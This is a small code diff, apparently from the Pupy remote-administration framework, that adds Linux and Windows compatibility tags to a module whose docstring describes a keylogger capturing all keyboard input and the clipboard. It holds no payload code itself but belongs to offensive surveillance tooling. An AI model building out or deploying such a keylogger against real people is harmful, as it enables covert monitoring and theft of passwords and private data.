@@ -14,7 +14,7 @@ from pupylib.utils.rpyc_utils import redirected_stdio
 
 __class_name__="KeyloggerModule"
 
-@config(cat="gather")
+@config(cat="gather", compat=["linux", "windows"])
 class KeyloggerModule(PupyModule):
     """ 
         A keylogger to monitor all keyboards interaction including the clipboard :-)
